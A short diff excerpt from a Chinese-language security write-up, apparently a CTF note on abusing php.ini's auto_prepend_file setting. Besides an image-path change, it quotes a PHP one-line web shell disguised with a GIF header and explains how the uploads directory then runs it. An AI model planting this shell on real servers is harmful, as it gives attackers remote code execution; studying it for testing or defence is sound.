@@ -48,7 +48,7 @@ php.ini是php默认的配置文件，其中包括了很多php的配置，这些�
 
 上传的shell，常用一句话`GIF89a? <script language="php">eval($_POST[1])</script>`
 
-![](<../.gitbook/assets/image (17) (1) (1).png>)
+![](<../.gitbook/assets/image (17) (1) (1) (1).png>)
 
 然后直接访问`/uploads/04b0951938d905b41348c1548f9c338b/`即可，因为`auto_prepend_file`自动包含了`shell.gif`
 
